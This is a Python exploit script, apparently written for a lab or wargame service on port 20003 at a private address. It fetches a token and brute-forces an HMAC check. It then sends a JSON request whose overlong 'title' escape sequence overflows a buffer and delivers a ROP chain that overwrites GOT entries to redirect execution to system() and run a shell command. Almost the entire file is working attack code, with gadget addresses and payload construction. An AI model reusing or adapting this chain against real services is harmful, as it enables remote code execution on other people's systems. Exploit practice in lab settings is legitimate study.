#!/usr/bin/python
import struct
import time
import socket
import hmac
import hashlib
import json

CMD = 'touch /tmp/hacked'


# Bypassed Layer Of Function
#  send_token() 	+
#  read_request()	+
#  validate_request();  +   
#  parse_request();     +
#  handle_request();    <--- EIP Control Found
#  post_blog_article();


# create socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# connect to target
s.connect(('192.168.56.101', 20003))

s.settimeout(2)

# fd
fd = s.makefile('rb')

# Token Received
token = fd.read(len('"// 127.0.0.1:36440-1531523912-1438653415-959081978"'))
while True:
	token += fd.read(1)
	if token[-1]=='"':
		break
print '[+] Token : ', token

# ROP Payload
# 8048f50 <strncmp@plt> --> 0x804bda0 <strncmp@got.plt>:	0xb7517ce0
# 0x080493fe : add dword ptr [ebx + 0x5d5b04c4], eax ; ret
# 0x08049c1e : mov dword ptr [edx], ebx ; add esp, 0x3c ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
# BLOG POST URL 0x08049f20
# 0x08049b4f : pop eax ; add esp, 0x5c ; ret
# Victim PLT 0x08048f40 <+0>:	jmp    DWORD PTR ds:0x804bd9c
# 0x804bd14 <calloc@got.plt>:	0xb7477420
# 0x08049402 : pop ebx ; pop ebp ; ret

#
# $1 = {<text variable, no debug info>} 0xb75a9fc0 <__srandom>
# $4 = {<text variable, no debug info>} 0xb75b3b20 <__libc_system>
# Differ = 39776
#
# $8 = {<text variable, no debug info>} 0xb75aad00 <__GI_strtol>
# Differ =  36384
# Srand 0x08048c20 <+0>:	jmp    DWORD PTR ds:0x804bcd4
#
# 0x804bdf4 <gContents>:	0x09487338
#


 # Fake EBP .bss
EBP = 0x0804bdc0+82 # 0x804be10
# ESP = 0x804be18
EBP = 0x804be08


rop = ''
rop += 'A'*19
rop += struct.pack('i',  0x804bcd4 - 0x5d5b04c4 ) # EBX 19 - 23 --> Calloc Address
rop += 'ESII' # ESI 23 - 27
rop += 'EDII' # EDI 27 - 31
rop += struct.pack("I", EBP) # EBP 31 - 35
rop += struct.pack('I', 0x08049b4f)
rop += '\\\u609b\\\u0000' # <-- EAX = 0x9b60
rop += 'D'*0x5c
rop += struct.pack('I', 0x080493fe)




# Memory Copy Section
#        void *memcpy(void *dest, const void *src, size_t n);

# Current Instruction
rop += struct.pack("I", 0x08048e60) # 8048e60 <memcpy@plt>
rop += struct.pack("I", 0x0804964d) # p p p ret 0x0804964d : pop ebx ; pop esi$
rop += struct.pack("I", EBP+4)
rop += struct.pack("I", 0x804bcd4) # Srand 0x08048c20 <+0>:        jmp    DWORD PTR ds:0x804bcd4
rop += '\\\u0400\\\u0000' #struct.pack("I", 4)

# Next Instruction
#rop += struct.pack("I", 0x08048e60) # 8048e60 <memcpy@plt>
#rop += struct.pack("I", 0x0804964d) # p p p ret 0x0804964d : pop ebx ; pop esi$
#rop += struct.pack("I", EBP+8)
#rop += struct.pack("I", 0x804bdac) # 0x804bdac <exit@got.plt>:	0x08048f86
#rop += '\\\u0400\\\u000' #struct.pack("I", 4)

# Argument

rop += struct.pack("I", 0x08048e60) # 8048e60 <memcpy@plt>
rop += struct.pack("I", 0x0804964d) # p p p ret 0x0804964d : pop ebx ; pop esi ; pop edi ; ret
rop += struct.pack("I", EBP+12)
rop += struct.pack("I", 0x804bdf4)
rop += '\\\u0400\\\u0000' #struct.pack("I", 4)

#rop += struct.pack('I', 0x08048c20) # <-- System
#rop += struct.pack("I", 0x08048f80) # EXIT
#rop += struct.pack("I", EBP)
#rop += '\xcc'*12
#rop = rop.encode('hex')

rop += struct.pack("I", 0x08049431)  # 0x08049431 : leave ; ret
rop += '\xcc'*16


JDATA = {
'title':"A"*127,
'serverip':'192.168.56.101',
'contents':'touch /tmp/hacked',
}

JDATA['title'] += '\\'
JDATA['title'] += 'u'
JDATA['title'] += 'ROP' # EIP

print '[*] Payload : ', JDATA['title']


#  Create Payload
payload = eval(token)
payload += '\n'
payload += json.JSONEncoder().encode(JDATA)
payload += '\n'
payload = payload.replace('ROP', rop)
print '[-] ROP Loaded : ', payload
payload += "N"*(4096-len(payload)) # Fill Blank Space


# Validating HMAC Condition
let = 0
letpayload = payload[:-6]
while True:
	if hmac.new(eval(token), letpayload+str(let).ljust(6, '-'), hashlib.sha1).digest()[:2]=='\x00\x00':
		payload = letpayload+str(let).ljust(6, '-')
		print '[+] Found HMAC Pair : ',
		print hmac.new(eval(token), payload, hashlib.sha1).hexdigest()
		break
	let+=1

print "[*] Number Of Cycle : ", let
print '[*] Sending Payload : ', len(payload)

s.send(payload)
print '[*] Payload Planted.'
time.sleep(0.5)

print s.recv(1024)
raw_input('Press Enter To Trigger Planted Payload..')
s.close()

